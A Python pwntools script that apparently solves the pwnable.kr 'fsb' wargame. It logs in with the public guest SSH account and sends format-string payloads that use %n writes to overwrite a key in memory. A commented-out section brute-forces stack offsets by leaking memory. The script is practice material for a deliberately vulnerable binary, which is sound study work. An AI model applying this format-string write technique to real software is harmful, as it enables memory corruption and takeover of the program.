from pwn import *

#context.log_level = "DEBUG"

context.terminal = ['tmux', 'splitw', '-v']

s = ssh(host='pwnable.kr', port=2222, user='fsb', password='guest')
#s.download_file('fsb')
#s.download_file('fsb.c')

key_addr = 0x0804a060

#p = process("./fsb") 
p = s.process("./fsb") 

write_key_1 = "%" + str(key_addr) + "d%14$n"
write_zero_1 = "%20$n"
write_key_2 = "%" + str(key_addr + 4) + "d%15$n"
write_zero_2 = "%21$n"

p.recvuntil("Give me some format strings(1)")
p.sendline(write_key_1)
p.recvuntil("Give me some format strings(2)")
p.sendline(write_zero_1)
p.recvuntil("Give me some format strings(3)")
p.sendline(write_key_2)
p.recvuntil("Give me some format strings(4)")
p.sendline(write_zero_2)

p.interactive()

# https://nickcano.com/pwnables-fsb/


#
#def get_key(p, leak):
#    p.sendline(leak)
#    r = p.recv()
#    return r
#
#
#def leak(p, leak):
#    p.sendline(leak);
#    r = p.recv();
#
#    if r == None:
#        return False
#
#    if "804a060" in r:
#        return True
#
#    return False
#
#
#def run():
#    for i in range(500):
#        p = process("./fsb")
#
#        found = False
#
#        key = "AAAA"
#        for x in range(4):
#            if found == True:
#                key = get_key(p, "%" + str(i) + "$s")
#            else:
#                found = leak(p, "%" + str(i) + "$x")
#
#        if found == False:
#            p.close()
#            continue
#
#        gdb.attach(p, '''
#        b *0x08048680
#        continue
#        ''')
#
#        key = key.split("\n")[0]
#        key_sum = (u32(key[:4]) + u32(key[4:])) << 0x1f
#        #p.recvuntil("key : ")
#        p.sendline(str(key_sum))
#        p.interactive()
#        exit()
#run()
